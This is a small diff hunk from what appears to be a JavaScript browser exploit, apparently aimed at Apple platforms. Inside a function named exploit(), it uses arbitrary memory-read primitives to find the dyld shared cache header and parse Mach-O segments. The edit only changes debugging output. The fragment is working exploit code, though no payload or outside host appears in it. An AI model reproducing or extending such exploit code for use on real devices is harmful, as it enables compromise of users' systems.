@@ -581,9 +581,9 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
-        var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
+        //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
-        alert('Mach-O header' + dcachedump)
+        alert('Mach-O header' + memory.u32(hdr))
         var base_seg = null;
         var nsegs    = memory.u32(Add(hdr, 0x14));
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
